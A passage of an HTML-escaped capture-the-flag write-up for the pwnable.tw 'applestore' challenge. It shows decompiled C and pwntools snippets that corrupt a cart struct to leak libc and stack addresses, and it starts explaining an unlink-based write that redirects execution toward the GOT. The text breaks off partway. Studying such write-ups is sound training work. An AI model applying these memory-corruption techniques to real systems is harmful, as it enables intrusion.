+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; in_GS_OFFSET;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; index;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; total;
+  cart_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cur_item;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+  
+  iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  index &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+  total &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Let me check your cart. ok? (y&#x2F;n) &amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fflush&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(stdout);
+  my_read(input,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x15&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;y&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;==== Cart ====&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    cur_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; myCart.next;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(cur_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(cart_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt; - $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,index,cur_item-&amp;gt;name,cur_item-&amp;gt;price);
+      total &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; total &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; cur_item-&amp;gt;price;
+      cur_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; cur_item-&amp;gt;next;
+      index &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; index &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    }
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)) {
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;__stack_chk_fail();
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; total;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We can use the input buffer to overwrite the fields of the vulnerable cart item. We need to set the first character of 
+our payload to &lt;code&gt;y&lt;&#x2F;code&gt;, and the second character to anything. The next 16 bytes contain the values of the struct:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;object data=&quot;&#x2F;posts&#x2F;pwnable-tw-applestore&#x2F;5f478a485f6cee02e28f0454.svg&quot; type=&quot;image&#x2F;svg+xml&quot;&gt;&lt;&#x2F;object&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We can set the name pointer to an arbitrary address to print the value at that address.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;leaking-libc-base-address&quot;&gt;Leaking Libc Base Address&lt;&#x2F;h3&gt;
+&lt;p&gt;By setting the name pointer to a global offset table (GOT) entry, we can leak the address of a function in libc. Since 
+we also have the libc file, we can calculate the base address of libc by subtracting the offset of the function.&lt;&#x2F;p&gt;
+&lt;p&gt;We can use the following to leak the address of &lt;code&gt;read&lt;&#x2F;code&gt; and calculate the base address of libc:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;create_cart_struct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(name_ptr, price_int, next_ptr&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, prev_ptr&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;):
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(name_ptr) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(price_int) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(next_ptr) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(prev_ptr)
+
+cart(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;yy&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;create_cart_struct(elf.got[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;read&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;27: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_READ_ADDR &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;u32(r.read(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+libc.address &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_READ_ADDR &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;read&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;leaking-a-stack-address&quot;&gt;Leaking a stack address&lt;&#x2F;h3&gt;
+&lt;p&gt;Now that we have the libc base address, we can leak a stack address by finding the value of the &lt;code&gt;char **environ&lt;&#x2F;code&gt; symbol 
+in libc. The value at the address pointed to by &lt;code&gt;environ&lt;&#x2F;code&gt; has a constant offset to the base stack pointer of delete. &lt;&#x2F;p&gt;
+&lt;p&gt;By using GDB, I found this offset to be 260. The following leaks the address pointed to by delete&#x27;s EBP: &lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cart(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;yy&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;create_cart_struct(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;environ&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+
+r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;27: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ENVIRON_STACK &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;u32(r.recv(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;DELETE_EBP &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ENVIRON_STACK &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;260
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;writing-to-arbitrary-addresses&quot;&gt;Writing to &lt;del&gt;arbitrary&lt;&#x2F;del&gt; addresses&lt;&#x2F;h2&gt;
+&lt;p&gt;The &lt;code&gt;delete&lt;&#x2F;code&gt; function is an interesting target to analyze when looking for a write primitive:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void delete&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; iVar1;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; in_GS_OFFSET;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; number;
+  cart_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cur_item;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input_str [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+  cart_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;next;
+  cart_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;prev;
+  
+  iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  number &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+  cur_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; myCart.next;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Item Number&amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fflush&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(stdout);
+  my_read(input_str,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x15&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  input &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;atoi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input_str);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;do &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(cur_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(cart_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+LAB_08048a5e:
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)) {
+        __stack_chk_fail();
+      }
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    }
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(number &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input) {
+      next &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; cur_item-&amp;gt;next;
+      prev &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; cur_item-&amp;gt;prev;
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(prev &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(cart_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+        prev-&amp;gt;next &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; next;
+      }
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(next &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(cart_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+        next-&amp;gt;prev &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; prev;
+      }
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Remove &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt; from your shopping cart.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,number,cur_item-&amp;gt;name);
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;goto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; LAB_08048a5e;
+    }
+    number &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; number &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    cur_item &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; cur_item-&amp;gt;next;
+  } &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;true &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;When a item is deleted, the &lt;code&gt;prev&lt;&#x2F;code&gt; and &lt;code&gt;next&lt;&#x2F;code&gt; pointers are used to remove references to the deleted item from both the 
+previous and following item. Unfortunately, this means that both of the addresses referenced will be modified. Therefore, 
+the modified memory must be writeable. This rules out overwriting a GOT entry to point to a function in libc.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;redirecting-execution-flow&quot;&gt;Redirecting execution flow&lt;&#x2F;h2&gt;
+&lt;p&gt;An interesting way around this limitation is to use the previously leaked base stack address. If we can overwrite the 
+stored base pointer, then we can have writes to stack addresses performed somewhere else in memory. One target to place 
+the stack over is the global offset table (GOT).&lt;&#x2F;p&gt;
+&lt;p&gt;We can set the next pointer to the address of the stored EBP - 0xc (because &lt;code&gt;next-&amp;gt;prev&lt;&#x2F;code&gt; would write to next + 0xc). &lt;&#x2F;p&gt;
+&lt;p&gt;Then we set the previous pointer to the address of atoi in the GOT + some offset. A suitable target on the stack that 
